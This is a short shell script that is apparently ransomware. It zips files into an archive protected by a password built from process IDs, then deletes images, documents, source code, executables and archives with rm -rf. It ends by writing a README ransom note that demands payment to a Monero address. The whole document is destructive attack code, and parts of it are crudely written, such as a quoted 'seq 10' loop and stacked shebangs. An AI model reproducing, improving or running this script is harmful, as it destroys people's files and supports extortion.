#!/bin/sh
#!/bin/bash
#!/bin/zsh
PASS=$(($$$$^64*32767^128*128^32767*$$^$$))
YR=$(date +%y)
STRING=$(echo $PASS | md5sum | head -c $YR)

for i in 'seq 10';
do
nohup zip --password $STRING Your\ Files. *.* */*
clear
nohup mkdir $STRING
clear
nohup rm -rf *.png *.jpg *.jpeg *.webp *.java *.bin *.htm *.html *.xlsx *.xlsm *.xlsb *.xltx *.docx *.doc *.jar *.mp3 *.mp4 *.py *.exe */*.* *.log *.rar *.zip
clear
nohup touch README
clear
echo '' >> README
echo 'Hi your files are under my control now unless u send XXX to this Monero Address   _____  ' >> README
clear
rm nohup.out
nano README & disown
sleep 20;
vim README & disown
sleep 20;
done
